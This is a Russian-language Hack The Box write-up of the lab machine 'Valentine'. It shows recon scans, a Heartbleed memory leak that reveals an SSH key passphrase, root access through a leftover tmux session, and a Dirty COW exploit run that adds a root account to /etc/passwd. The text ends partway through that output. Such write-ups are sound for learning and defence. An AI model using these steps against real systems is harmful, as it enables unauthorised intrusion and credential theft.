---
layout: post
title: "HTB{ Valentine }"
date: 2018-08-14 00:00:00 +0300
author: snovvcrash
categories: ctf write-ups boxes hackthebox
tags: [ctf, write-ups, boxes, hackthebox, Valentine, linux, heartbleed, tmux, dirtycow]
comments: true
published: true
---

**Valentine** входит в тройку первых решенных мною машин на HackTheBox. Вскрытие будет включать в себя эксплуатацию *Heartbleed*, уязвимости протокола *OpenSSL*, наделавшей много шума в свое время, а также использование менеджера терминальных сессий *tmux*. Как и у большинства машин, у Valentine существует не единственный способ повышения привилегий до суперпользователя, второй, к слову, достаточно *грязный*, но мы разберем и его. **Сложность: 4.2/10**{:style="color:orange;"}

<!--cut-->

{: .center-image}
[![valentine-banner.png]({{ "/img/htb/boxes/valentine/valentine-banner.png" | relative_url }})](https://www.hackthebox.eu/home/machines/profile/127 "Hack The Box :: Valentine")

{: .center-image}
![valentine-info.png]({{ "/img/htb/boxes/valentine/valentine-info.png" | relative_url }})

* TOC
{:toc}

# Разведка
## Nmap
Начнем со сканирования хоста. Сперва пробежим быстрое SYN-сканирования 1000 самых распространенных портов:
```text
root@kali:~# nmap -n -v -sS -Pn -oN nmap/initial.nmap 10.10.10.79
...
```

```text
root@kali:~# cat nmap/initial.nmap
# Nmap 7.70 scan initiated Tue Jul 17 15:30:26 2018 as: nmap -n -v -sS -Pn -oN nmap/initial.nmap 10.10.10.79
Nmap scan report for 10.10.10.79
Host is up (0.099s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https

Read data files from: /usr/bin/../share/nmap
# Nmap done at Tue Jul 17 15:30:28 2018 -- 1 IP address (1 host up) scanned in 1.89 seconds
```

После чего посмотрим более подробно на сервисы, крутящиеся на открытых портах:
```text
root@kali:~# nmap -n -v -sV -sC -oN nmap/version.nmap -p22,80,443 10.10.10.79
...
```

```text
root@kali:~# cat nmap/version.nmap
# Nmap 7.70 scan initiated Tue Aug 14 09:21:01 2018 as: nmap -n -v -sV -sC -oN nmap/version.nmap -p22,80,443 10.10.10.79
Nmap scan report for 10.10.10.79
Host is up (0.089s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 96:4c:51:42:3c:ba:22:49:20:4d:3e:ec:90:cc:fd:0e (DSA)
|   2048 46:bf:1f:cc:92:4f:1d:a0:42:b3:d2:16:a8:58:31:33 (RSA)
|_  256 e6:2b:25:19:cb:7e:54:cb:0a:b9:ac:16:98:c6:7d:a9 (ECDSA)
80/tcp  open  http     Apache httpd 2.2.22 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
443/tcp open  ssl/http Apache httpd 2.2.22 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=valentine.htb/organizationName=valentine.htb/stateOrProvinceName=FL/countryName=US
| Issuer: commonName=valentine.htb/organizationName=valentine.htb/stateOrProvinceName=FL/countryName=US
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2018-02-06T00:45:25
| Not valid after:  2019-02-06T00:45:25
| MD5:   a413 c4f0 b145 2154 fb54 b2de c7a9 809d
|_SHA-1: 2303 80da 60e7 bde7 2ba6 76dd 5214 3c3c 6f53 01b1
|_ssl-date: 2018-08-14T13:21:17+00:00; 0s from scanner time.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Aug 14 09:21:21 2018 -- 1 IP address (1 host up) scanned in 20.44 seconds
```

Есть SSH, Web (HTTP) и TLS/SSL. Давайте по порядку.

# Web — Порт 80
## Браузер
Первым делом глянем, что творится на веб-страничке, предоставленной сервером Apache на 80-м порту. Запустим браузер и перейдем по `10.10.10.79`:

[![valentine-port80-index-php.png]({{ "/img/htb/boxes/valentine/valentine-port80-index-php.png" | relative_url }})]({{ "/img/htb/boxes/valentine/valentine-port80-index-php.png" | relative_url }})

Хмм, картинка... В исходниках ничего интересного, да и не за чем смотреть было на самом деле — изображение, как впрочем и само название машины, уже кричит в лицо о направлении, которого следует придерживаться. Скоро мы вернемся к Heartbleed'у, а пока еще немного помучаем веб-сайт.

## dirb
Поищем интересные странички, скрытые от глаз обычного посетителя. Дефолтного словаря утилиты `dirb` будет достаточно:
```text
root@kali:~# dirb http://10.10.10.84 -r -o dirb/valentine.dirb
-----------------
DIRB v2.22    
By The Dark Raver
-----------------

OUTPUT_FILE: valentine.dirb
URL_BASE: http://10.10.10.79/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
OPTION: Not Recursive

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://10.10.10.79/ ----
+ http://10.10.10.79/cgi-bin/ (CODE:403|SIZE:287)
+ http://10.10.10.79/decode (CODE:200|SIZE:552)
==> DIRECTORY: http://10.10.10.79/dev/
+ http://10.10.10.79/encode (CODE:200|SIZE:554)
+ http://10.10.10.79/index (CODE:200|SIZE:38)
+ http://10.10.10.79/index.php (CODE:200|SIZE:38)
+ http://10.10.10.79/server-status (CODE:403|SIZE:292)

-----------------
DOWNLOADED: 4612 - FOUND: 6
```

### /dev
Нашли директорию с кокетливым названием **dev**, внутри 2 файла:

[![valentine-port80-dev.png]({{ "/img/htb/boxes/valentine/valentine-port80-dev.png" | relative_url }})]({{ "/img/htb/boxes/valentine/valentine-port80-dev.png" | relative_url }})

**hype_key**

Просто набор байт:
```text
2d 2d 2d 2d 2d 42 45 47 49 4e 20 52 53 41 20 50 52 49 56 41 54 45 20 4b 45 59 2d 2d 2d 2d 2d 0d 0a 50 72 6f 63 2d 54 79 70 65 3a 20 34 2c 45 4e 43 52 59 50 54 45 44 0d 0a 44 45 4b 2d 49 6e 66 6f 3a 20 41 45 53 2d 31 32 38 2d 43 42 43 2c 41 45 42 38 38 43 31 34 30 46 36 39 42 46 32 30 37 34 37 38 38 44 45 32 34 41 45 34 38 44 34 36 0d 0a 0d 0a 44 62 50 72 4f 37 38 6b 65 67 4e 75 6b 31 44 41 71 6c 41 4e 35 6a 62 6a 58 76 30 50 50 73 6f 67 33 6a 64 62 4d 46 53 38 69 45 39 70 33 55 4f 4c 30 6c 46 30 78 66 37 50 7a 6d 72 6b 44 61 38 52 0d 0a 35 79 2f 62 34 36 2b 39 6e 45 70 43 4d 66 54 50 68 4e 75 4a 52 63 57 32 55 32 67 4a 63 4f 46 48 2b 39 52 4a 44 42 43 35 55 4a 4d 55 53 31 2f 67 6a 42 2f 37 2f 4d 79 30 30 4d 77 78 2b 61 49 36 0d 0a 30 45 49 30 53 62 4f 59 55 41 56 31 57 34 45 56 37 6d 39 36 51 73 5a 6a 72 77 4a 76 6e 6a 56 61 66 6d 36 56 73 4b 61 54 50 42 48 70 75 67 63 41 53 76 4d 71 7a 37 36 57 36 61 62 52 5a 65 58 69 0d 0a 45 62 77 36 36 68 6a 46 6d 41 75 34 41 7a 71 63 4d 2f 6b 69 67 4e 52 46 50 59 75 4e 69 58 72 58 73 31 77 2f 64 65 4c 43 71 43 4a 2b 45 61 31 54 38 7a 6c 61 73 36 66 63 6d 68 4d 38 41 2b 38 50 0d 0a 4f 58 42 4b 4e 65 36 6c 31 37 68 4b 61 54 36 77 46 6e 70 35 65 58 4f 61 55 49 48 76 48 6e 76 4f 36 53 63 48 56 57 52 72 5a 37 30 66 63 70 63 70 69 6d 4c 31 77 31 33 54 67 64 64 32 41 69 47 64 0d 0a 70 48 4c 4a 70 59 55 49 49 35 50 75 4f 36 78 2b 4c 53 38 6e 31 72 2f 47 57 4d 71 53 4f 45 69 6d 4e 52 44 31 6a 2f 35 39 2f 34 75 33 52 4f 72 54 43 4b 65 6f 39 44 73 54 52 71 73 32 6b 31 53 48 0d 0a 51 64 57 77 46 77 61 58 62 59 79 54 31 75 78 41 4d 53 6c 35 48 71 39 4f 44 35 48 4a 38 47 30 52 36 4a 49 35 52 76 43 4e 55 51 6a 77 78 30 46 49 54 6a 6a 4d 6a 6e 4c 49 70 78 6a 76 66 71 2b 45 0d 0a 70 30 67 44 30 55 63 79 6c 4b 6d 36 72 43 5a 71 61 63 77 6e 53 64 64 48 57 38 57 33 4c 78 4a 6d 43 78 64 78 57 35 6c 74 35 64 50 6a 41 6b 42 59 52 55 6e 6c 39 31 45 53 43 69 44 34 5a 2b 75 43 0d 0a 4f 6c 36 6a 4c 46 44 32 6b 61 4f 4c 66 75 79 65 65 30 66 59 43 62 37 47 54 71 4f 65 37 45 6d 4d 42 33 66 47 49 77 53 64 57 38 4f 43 38 4e 57 54 6b 77 70 6a 63 30 45 4c 62 6c 55 61 36 75 6c 4f 0d 0a 74 39 67 72 53 6f 73 52 54 43 73 5a 64 31 34 4f 50 74 73 34 62 4c 73 70 4b 78 4d 4d 4f 73 67 6e 4b 6c 6f 58 76 6e 6c 50 4f 53 77 53 70 57 79 39 57 70 36 79 38 58 58 38 2b 46 34 30 72 78 6c 35 0d 0a 58 71 68 44 55 42 68 79 6b 31 43 33 59 50 4f 69 44 75 50 4f 6e 4d 58 61 49 70 65 31 64 67 62 30 4e 64 44 31 4d 39 5a 51 53 4e 55 4c 77 31 44 48 43 47 50 50 34 4a 53 53 78 58 37 42 57 64 44 4b 0d 0a 61 41 6e 57 4a 76 46 67 6c 41 34 6f 46 42 42 56 41 38 75 41 50 4d 66 56 32 58 46 51 6e 6a 77 55 54 35 62 50 4c 43 36 35 74 46 73 74 6f 52 74 54 5a 31 75 53 72 75 61 69 32 37 6b 78 54 6e 4c 51 0d 0a 2b 77 51 38 37 6c 4d 61 64 64 73 31 47 51 4e 65 47 73 4b 53 66 38 52 2f 72 73 52 4b 65 65 4b 63 69 6c 44 65 50 43 6a 65 61 4c 71 74 71 78 6e 68 4e 6f 46 74 67 30 4d 78 74 36 72 32 67 62 31 45 0d 0a 41 6c 6f 51 36 6a 67 35 54 62 6a 35 4a 37 71 75 59 58 5a 50 79 6c 42 6c 6a 4e 70 39 47 56 70 69 6e 50 63 33 4b 70 48 74 74 76 67 62 70 74 66 69 57 45 45 73 5a 59 6e 35 79 5a 50 68 55 72 39 51 0d 0a 72 30 38 70 6b 4f 78 41 72 58 45 32 64 6a 37 65 58 2b 62 71 36 35 36 33 35 4f 4a 36 54 71 48 62 41 6c 54 51 31 52 73 39 50 75 6c 72 53 37 4b 34 53 4c 58 37 6e 59 38 39 2f 52 5a 35 6f 53 51 65 0d 0a 32 56 57 52 79 54 5a 31 46 66 6e 67 4a 53 73 76 39 2b 4d 66 76 7a 33 34 31 6c 62 7a 4f 49 57 6d 6b 37 57 66 45 63 57 63 48 63 31 36 6e 39 56 30 49 62 53 4e 41 4c 6e 6a 54 68 76 45 63 50 6b 79 0d 0a 65 31 42 73 66 53 62 73 66 39 46 67 75 55 5a 6b 67 48 41 6e 6e 66 52 4b 6b 47 56 47 31 4f 56 79 75 77 63 2f 4c 56 6a 6d 62 68 5a 7a 4b 77 4c 68 61 5a 52 4e 64 38 48 45 4d 38 36 66 4e 6f 6a 50 0d 0a 30 39 6e 56 6a 54 61 59 74 57 55 58 6b 30 53 69 31 57 30 32 77 62 75 31 4e 7a 4c 2b 31 54 67 39 49 70 4e 79 49 53 46 43 46 59 6a 53 71 69 79 47 2b 57 55 37 49 77 4b 33 59 55 35 6b 70 33 43 43 0d 0a 64 59 53 63 7a 36 33 51 32 70 51 61 66 78 66 53 62 75 76 34 43 4d 6e 4e 70 64 69 72 56 4b 45 6f 35 6e 52 52 66 4b 2f 69 61 4c 33 58 31 52 33 44 78 56 38 65 53 59 46 4b 46 4c 36 70 71 70 75 58 0d 0a 63 59 35 59 5a 4a 47 41 70 2b 4a 78 73 6e 49 51 39 43 46 79 78 49 74 39 32 66 72 58 7a 6e 73 6a 68 6c 59 61 38 73 76 62 56 4e 4e 66 6b 2f 39 66 79 58 36 6f 70 32 34 72 4c 32 44 79 45 53 70 59 0d 0a 70 6e 73 75 6b 42 43 46 42 6b 5a 48 57 4e 4e 79 65 4e 37 62 35 47 68 54 56 43 6f 64 48 68 7a 48 56 46 65 68 54 75 42 72 70 2b 56 75 50 71 61 71 44 76 4d 43 56 65 31 44 5a 43 62 34 4d 6a 41 6a 0d 0a 4d 73 6c 66 2b 39 78 4b 2b 54 58 45 4c 33 69 63 6d 49 4f 42 52 64 50 79 77 36 65 2f 4a 6c 51 6c 56 52 6c 6d 53 68 46 70 49 38 65 62 2f 38 56 73 54 79 4a 53 65 2b 62 38 35 33 7a 75 56 32 71 4c 0d 0a 73 75 4c 61 42 4d 78 59 4b 6d 33 2b 7a 45 44 49 44 76 65 4b 50 4e 61 61 57 5a 67 45 63 71 78 79 6c 43 43 2f 77 55 79 55 58 6c 4d 4a 35 30 4e 77 36 4a 4e 56 4d 4d 38 4c 65 43 69 69 33 4f 45 57 0d 0a 6c 30 6c 6e 39 4c 31 62 2f 4e 58 70 48 6a 47 61 38 57 48 48 54 6a 6f 49 69 6c 42 35 71 4e 55 79 79 77 53 65 54 42 46 32 61 77 52 6c 58 48 39 42 72 6b 5a 47 34 46 63 34 67 64 6d 57 2f 49 7a 54 0d 0a 52 55 67 5a 6b 62 4d 51 5a 4e 49 49 66 7a 6a 31 51 75 69 6c 52 56 42 6d 2f 46 37 36 59 2f 59 4d 72 6d 6e 4d 39 6b 2f 31 78 53 47 49 73 6b 77 43 55 51 2b 39 35 43 47 48 4a 45 38 4d 6b 68 44 33 0d 0a 2d 2d 2d 2d 2d 45 4e 44 20 52 53 41 20 50 52 49 56 41 54 45 20 4b 45 59 2d 2d 2d 2d 2d
```

Очевидно, это SSH-ключ (по названию судя)? Проверим это предположение:
```text
root@kali:~# cat hype_key | xxd -ps -r
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,AEB88C140F69BF2074788DE24AE48D46

DbPrO78kegNuk1DAqlAN5jbjXv0PPsog3jdbMFS8iE9p3UOL0lF0xf7PzmrkDa8R
5y/b46+9nEpCMfTPhNuJRcW2U2gJcOFH+9RJDBC5UJMUS1/gjB/7/My00Mwx+aI6
0EI0SbOYUAV1W4EV7m96QsZjrwJvnjVafm6VsKaTPBHpugcASvMqz76W6abRZeXi
Ebw66hjFmAu4AzqcM/kigNRFPYuNiXrXs1w/deLCqCJ+Ea1T8zlas6fcmhM8A+8P
OXBKNe6l17hKaT6wFnp5eXOaUIHvHnvO6ScHVWRrZ70fcpcpimL1w13Tgdd2AiGd
pHLJpYUII5PuO6x+LS8n1r/GWMqSOEimNRD1j/59/4u3ROrTCKeo9DsTRqs2k1SH
QdWwFwaXbYyT1uxAMSl5Hq9OD5HJ8G0R6JI5RvCNUQjwx0FITjjMjnLIpxjvfq+E
p0gD0UcylKm6rCZqacwnSddHW8W3LxJmCxdxW5lt5dPjAkBYRUnl91ESCiD4Z+uC
Ol6jLFD2kaOLfuyee0fYCb7GTqOe7EmMB3fGIwSdW8OC8NWTkwpjc0ELblUa6ulO
t9grSosRTCsZd14OPts4bLspKxMMOsgnKloXvnlPOSwSpWy9Wp6y8XX8+F40rxl5
XqhDUBhyk1C3YPOiDuPOnMXaIpe1dgb0NdD1M9ZQSNULw1DHCGPP4JSSxX7BWdDK
aAnWJvFglA4oFBBVA8uAPMfV2XFQnjwUT5bPLC65tFstoRtTZ1uSruai27kxTnLQ
+wQ87lMadds1GQNeGsKSf8R/rsRKeeKcilDePCjeaLqtqxnhNoFtg0Mxt6r2gb1E
AloQ6jg5Tbj5J7quYXZPylBljNp9GVpinPc3KpHttvgbptfiWEEsZYn5yZPhUr9Q
r08pkOxArXE2dj7eX+bq65635OJ6TqHbAlTQ1Rs9PulrS7K4SLX7nY89/RZ5oSQe
2VWRyTZ1FfngJSsv9+Mfvz341lbzOIWmk7WfEcWcHc16n9V0IbSNALnjThvEcPky
e1BsfSbsf9FguUZkgHAnnfRKkGVG1OVyuwc/LVjmbhZzKwLhaZRNd8HEM86fNojP
09nVjTaYtWUXk0Si1W02wbu1NzL+1Tg9IpNyISFCFYjSqiyG+WU7IwK3YU5kp3CC
dYScz63Q2pQafxfSbuv4CMnNpdirVKEo5nRRfK/iaL3X1R3DxV8eSYFKFL6pqpuX
cY5YZJGAp+JxsnIQ9CFyxIt92frXznsjhlYa8svbVNNfk/9fyX6op24rL2DyESpY
pnsukBCFBkZHWNNyeN7b5GhTVCodHhzHVFehTuBrp+VuPqaqDvMCVe1DZCb4MjAj
Mslf+9xK+TXEL3icmIOBRdPyw6e/JlQlVRlmShFpI8eb/8VsTyJSe+b853zuV2qL
suLaBMxYKm3+zEDIDveKPNaaWZgEcqxylCC/wUyUXlMJ50Nw6JNVMM8LeCii3OEW
l0ln9L1b/NXpHjGa8WHHTjoIilB5qNUyywSeTBF2awRlXH9BrkZG4Fc4gdmW/IzT
RUgZkbMQZNIIfzj1QuilRVBm/F76Y/YMrmnM9k/1xSGIskwCUQ+95CGHJE8MkhD3
-----END RSA PRIVATE KEY-----
```

Все так. Ключ зашифрован парольной фразой, поэтому просто так к серверу нам подключиться не дадут. Cоберем ключ в отдельный файл, сохранив вывод последней команды:
```text
root@kali:~# !! > rsa.key
```

и посмотрим, где можно найти пароль.

**notes.txt**

А здесь TODO-list:
```text
To do:

1) Coffee.
2) Research.
3) Fix decoder/encoder before going live.
4) Make sure encoding/decoding is only done client-side.
5) Don't use the decoder/encoder until any of this is done.
6) Find a better way to take notes.
```

Автор говорит, что неплохо бы пофиксить кодировщик/декодировщик, запомним это (и да, лучше бы тебе, бро, найти другой способ вести заметки :smiling_imp:).

### /encode
Base64-кодировщик:

[![valentine-port80-encode-php.png]({{ "/img/htb/boxes/valentine/valentine-port80-encode-php.png" | relative_url }})]({{ "/img/htb/boxes/valentine/valentine-port80-encode-php.png" | relative_url }})

Результат кодирования:
```text
Your input:
hackthebox
Your encoded input:
aGFja3RoZWJveA==
```

### /decode
Base64-декодировщик:

[![valentine-port80-decode-php.png]({{ "/img/htb/boxes/valentine/valentine-port80-decode-php.png" | relative_url }})]({{ "/img/htb/boxes/valentine/valentine-port80-decode-php.png" | relative_url }})

Результат декодирования:
```text
Your input:

aGFja3RoZWJveA==

Your encoded input:

hackthebox
```

Пока неясно предназначение обоих инструментов, но тот факт, что использовать их небезопасно (по словам автора заметки), может в дальнейшем сыграть нам на руку.

# TLS/SSL — Порт 443. Heartbleed
[Heartbleed](https://ru.wikipedia.org/wiki/Heartbleed "Heartbleed — Википедия") ([CVE-2014-0160](https://nvd.nist.gov/vuln/detail/CVE-2014-0160 "NVD - CVE-2014-0160")) — нашумевшая двусторонняя "с уровнем опасности в 11/10" *buffer-over-read*-уязвимость в программном криптообеспечении OpenSSL, позволяющая несанкционированно читать оперативую память кусками до 64 Кб. Где только не писали про эту ошибку, материала про нее достаточно (и [раз](https://security.stackexchange.com/questions/55116/how-exactly-does-the-openssl-tls-heartbeat-heartbleed-exploit-work/55117#55117 "How exactly does the OpenSSL TLS heartbeat (Heartbleed) exploit work? - Information Security Stack Exchange"), и [два](https://www.seancassidy.me/diagnosis-of-the-openssl-heartbleed-bug.html "sean cassidy : Diagnosis of the OpenSSL Heartbleed Bug"), и [три](https://blog.cryptographyengineering.com/2014/04/08/attack-of-the-week-openssl-heartbleed "Attack of the week: OpenSSL Heartbleed – A Few Thoughts on Cryptographic Engineering"); а еще [четыре](https://habr.com/post/218661 "Последствия OpenSSL HeartBleed / Хабрахабр") и [пять](https://habr.com/post/219105 "В АНБ знали о уязвимости Heartbleed два года назад / Хабрахабр"), ну так по приколу), я же в рамках этого поста ограничюсь информативным [xkcd-комиксом](https://xkcd.com/1354 "xkcd: Heartbleed Explanation"):

[![heartbleed_explanation.png](https://imgs.xkcd.com/comics/heartbleed_explanation.png)](https://imgs.xkcd.com/comics/heartbleed_explanation.png)

С помощью скриптового движка `nmap` подтвердим свое предположение относительно уязвимости сервера к Heartbleed:
```text
root@kali:~# nmap -n -v -sS -oN --script=ssl-heartbleed nmap/nse-ssl-heartbleed.nmap -p443 10.10.10.79
Nmap scan report for 10.10.10.79
Host is up (0.062s latency).

PORT    STATE SERVICE
443/tcp open  https
| ssl-heartbleed: 
|   VULNERABLE:
|   The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealing information intended to be protected by SSL/TLS encryption.
|     State: VULNERABLE
|     Risk factor: High
|       OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1) of OpenSSL are affected by the Heartbleed bug. The bug allows for reading memory of systems protected by the vulnerable OpenSSL versions and could allow for disclosure of otherwise encrypted confidential information as well as the encryption keys themselves.
|           
|     References:
|       http://cvedetails.com/cve/2014-0160/
|       http://www.openssl.org/news/secadv_20140407.txt 
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160

Read data files from: /usr/bin/../share/nmap
# Nmap done at Mon Aug 13 14:24:44 2018 -- 1 IP address (1 host up) scanned in 1.12 seconds
```

Уязвим! Воспользуемся Heartbleed-эксплойтом для атаки на сервер. Можно применить скрипт "из коробки", входящий в состав Metasploit, но я решил найти решение на просторах GitHub. Выбор пал на [следующий Proof-of-Concept](https://github.com/mpgn/heartbleed-PoC "mpgn/heartbleed-PoC: Hearbleed exploit to retrieve sensitive information"), написанный на Пайтоне. После загрузки запустим скрипт:
```text
root@kali:~# ./heartbleed-exploit.py 10.10.10.79
Connecting...
Sending Client Hello...
 ... received message: type = 22, ver = 0302, length = 66
 ... received message: type = 22, ver = 0302, length = 885
 ... received message: type = 22, ver = 0302, length = 331
 ... received message: type = 22, ver = 0302, length = 4
Handshake done...
Sending heartbeat request with length 4 :
 ... received message: type = 24, ver = 0302, length = 16384
Received heartbeat response in file out.txt
WARNING : server returned more data than it should - server is vulnerable!
```

В файле `out.txt` находится полученная от сервера информация (листинг большой, приведу только интересующую нас часть):
```
root@kali:~# cat out.txt
...
  00d0: 10 00 11 00 23 00 00 00 0F 00 01 01 30 2E 30 2E  ....#.......0.0.
  00e0: 31 2F 64 65 63 6F 64 65 2E 70 68 70 0D 0A 43 6F  1/decode.php..Co
  00f0: 6E 74 65 6E 74 2D 54 79 70 65 3A 20 61 70 70 6C  ntent-Type: appl
  0100: 69 63 61 74 69 6F 6E 2F 78 2D 77 77 77 2D 66 6F  ication/x-www-fo
  0110: 72 6D 2D 75 72 6C 65 6E 63 6F 64 65 64 0D 0A 43  rm-urlencoded..C
  0120: 6F 6E 74 65 6E 74 2D 4C 65 6E 67 74 68 3A 20 34  ontent-Length: 4
  0130: 32 0D 0A 0D 0A 24 74 65 78 74 3D 61 47 56 68 63  2....$text=aGVhc
  0140: 6E 52 69 62 47 56 6C 5A 47 4A 6C 62 47 6C 6C 64  nRibGVlZGJlbGlld
  0150: 6D 56 30 61 47 56 6F 65 58 42 6C 43 67 3D 3D 5F  mV0aGVoeXBlCg==_
  0160: CB 1D 08 7B 54 41 44 CA CF BE 90 80 D9 7B 4F 37  ...{TAD......{O7
  0170: 4D 90 DA 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C  M...............
  0180: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
...
```

Из внутрянной памяти сервера вытянули строчку `aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==`, которую кто-то предположительно вводил в декодер. Переведем в осмысленный текст:
```text
root@kali:~# base64 -d <<< 'aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg=='
heartbleedbelievethehype
```

Интуиция подсказывает, что сие есть парольная фраза от private-ключа, полученного ранее. Расшифруем ключ:
```text
root@kali:~# openssl rsa -in rsa.key -out rsa_decrypted.key
Enter pass phrase for rsa.key: heartbleedbelievethehype
writing RSA key
```

Установим необходимые биты доступа:
```text
root@kali:~# chmod 600 rsa_decrypted.key
```

и перейдем к следующей части.

# SSH — Порт 22 (внутри машины)
Теперь можно с чистой совестью подключиться к Valentine по SSH (имя пользователя, кстати, пришлось угадывать, к счастью это было не трудно :expressionless:):
```
root@kali:~# ssh -i rsa_decrypted.key hype@10.10.10.79
hype@Valentine:~$ whoami
hype

hype@Valentine:~$ id
uid=1000(hype) gid=1000(hype) groups=1000(hype),24(cdrom),30(dip),46(plugdev),124(sambashare)

hype@Valentine:~$ uname -a
Linux Valentine 3.2.0-23-generic #36-Ubuntu SMP Tue Apr 10 20:39:51 UTC 2012 x86_64 x86_64 x86_64 GNU/Linux
```

## user.txt
Версия ядра нескромно намекает на возможность использования *Dirty COW*, но мы оставим *грязные* способы взломы на крайний случай, а пока заберем флаг пользователя:
```text
hype@Valentine:~$ cat Desktop/user.txt
e6710a54????????????????????????
```

и еще пошаримся по системе.

## PrivEsc: hype → root. Способ 1
Проверим домашний каталог:
```text
hype@Valentine:~$ ls -la
total 144
drwxr-xr-x 21 hype hype  4096 Feb  5  2018 .
drwxr-xr-x  3 root root  4096 Dec 11  2017 ..
-rw-------  1 hype hype   131 Feb 16 14:21 .bash_history
-rw-r--r--  1 hype hype   220 Dec 11  2017 .bash_logout
-rw-r--r--  1 hype hype  3486 Dec 11  2017 .bashrc
drwx------ 11 hype hype  4096 Dec 11  2017 .cache
drwx------  9 hype hype  4096 Dec 11  2017 .config
drwx------  3 hype hype  4096 Dec 11  2017 .dbus
drwxr-xr-x  2 hype hype  4096 Dec 13  2017 Desktop
-rw-r--r--  1 hype hype    26 Dec 11  2017 .dmrc
drwxr-xr-x  2 hype hype  4096 Dec 11  2017 Documents
drwxr-xr-x  2 hype hype  4096 Dec 11  2017 Downloads
drwxr-xr-x  2 hype hype  4096 Dec 11  2017 .fontconfig
drwx------  3 hype hype  4096 Dec 11  2017 .gconf
drwx------  4 hype hype  4096 Dec 11  2017 .gnome2
-rw-rw-r--  1 hype hype   132 Dec 11  2017 .gtk-bookmarks
drwx------  2 hype hype  4096 Dec 11  2017 .gvfs
-rw-------  1 hype hype   636 Dec 11  2017 .ICEauthority
drwxr-xr-x  3 hype hype  4096 Dec 11  2017 .local
drwx------  3 hype hype  4096 Dec 11  2017 .mission-control
drwxr-xr-x  2 hype hype  4096 Dec 11  2017 Music
drwxr-xr-x  2 hype hype  4096 Dec 11  2017 Pictures
-rw-r--r--  1 hype hype   675 Dec 11  2017 .profile
drwxr-xr-x  2 hype hype  4096 Dec 11  2017 Public
drwx------  2 hype hype  4096 Dec 11  2017 .pulse
-rw-------  1 hype hype   256 Dec 11  2017 .pulse-cookie
drwx------  2 hype hype  4096 Dec 13  2017 .ssh
drwxr-xr-x  2 hype hype  4096 Dec 11  2017 Templates
-rw-r--r--  1 root root    39 Dec 13  2017 .tmux.conf
drwxr-xr-x  2 hype hype  4096 Dec 11  2017 Videos
-rw-------  1 hype hype     0 Dec 11  2017 .Xauthority
-rw-------  1 hype hype 12173 Dec 11  2017 .xsession-errors
-rw-------  1 hype hype  9659 Dec 11  2017 .xsession-errors.old
```

`.bash_history` не указывает на `/dev/null`, заглянем:
```text
hype@Valentine:~$ cat .bash_history
exit
exot
exit
ls -la
cd /
ls -la
cd .devs
ls -la
tmux -L dev_sess
tmux a -t dev_sess
tmux --help
tmux -S /.devs/dev_sess
exit
```

Ооо, чувствую себя ребенком ~~на горбушке~~ в конфетной лавке, нам оставили **dev**-сессию! Вкратце о `tmux`: это такая утилита, позволяющая управлять терминальными сессиями, в том числе и "замораживать" текущее их состояние с возможностью последующего возобновления. Что мы и сделаем — восстановим приостановленную сессию из сокета `/.devs/dev_sess`, предварительно посмотрев, какие сессии доступны в принципе:
```text
hype@Valentine:~$ tmux -S /.devs/dev_sess ls
0: 1 windows (created Tue Jul 17 12:47:17 2018) [80x24]

hype@Valentine:~$ tmux -S /.devs/dev_sess a -t 0
root@Valentine:/# whoami
root

root@Valentine:/# id
uid=0(root) gid=0(root) groups=0(root)
```

### root.txt
Забираем флаг рута и идем радоваться жизни:
```text
root@Valentine:/# cat /root/root.txt
f1bb6d75????????????????????????
```

## PrivEsc: hype → root. Способ 2
Настало время для *грязных* (никогда не надоест :joy:) забав. Повысим привилегии до суперпользователя, вызвав состояние гонки в механизме копирования при записи, или просто проэксплуатируем уязвимость [Dirty COW](https://ru.wikipedia.org/wiki/%D0%A3%D1%8F%D0%B7%D0%B2%D0%B8%D0%BC%D0%BE%D1%81%D1%82%D1%8C_Dirty_COW "Уязвимость Dirty COW — Википедия") ([CVE-2016-5195](https://nvd.nist.gov/vuln/detail/CVE-2016-5195 "NVD - CVE-2016-5195")). Из [большого количества](https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs "PoCs · dirtycow/dirtycow.github.io Wiki") PoC-ов для демонстрации я обычно выбираю вот [этот](https://github.com/FireFart/dirtycow/blob/master/dirty.c "dirtycow/dirty.c at master · FireFart/dirtycow") (основанный на подмене root-записи в `/etc/password`) как наиболее стабильный и полностью обратимый.

Скачав исходник на машину-жертву, соберем и запустим:
```text
hype@Valentine:~$ gcc -pthread dirty.c -o dirty -lcrypt
hype@Valentine:~$ ./dirty
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password: qwe123!@#
Complete line:
firefart:fiDBsH4uAQ9kk:0:0:pwned:/root:/bin/bash

mmap: 7f2b85843000
madvise 0

ptrace 0
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'firefart' and the password 'qwerty'.


DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
Done! Check /etc/passwd to see if the new user was created.
